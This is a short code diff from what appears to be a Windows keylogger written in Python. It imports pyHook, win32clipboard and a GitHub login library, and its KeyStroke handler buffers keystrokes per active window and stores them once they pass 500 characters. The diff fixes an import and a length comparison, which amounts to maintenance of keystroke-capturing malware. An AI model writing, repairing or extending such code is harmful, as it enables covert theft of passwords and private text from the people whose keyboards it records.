@@ -2,11 +2,12 @@ from ctypes import *
 from github3 import login
 from uuid import getnode
 import base64
+import pywin
 import pythoncom
 import pyHook
 import win32clipboard
 import platform
-import datetime
+from datetime import datetime
 
 
 user32 = windll.user32
@@ -78,7 +79,7 @@ def KeyStroke(event):
 
     global current_window, data
 
-    if data>500:
+    if len(data)>500:
         store_output(data)
 
     if event.WindowName != current_window:
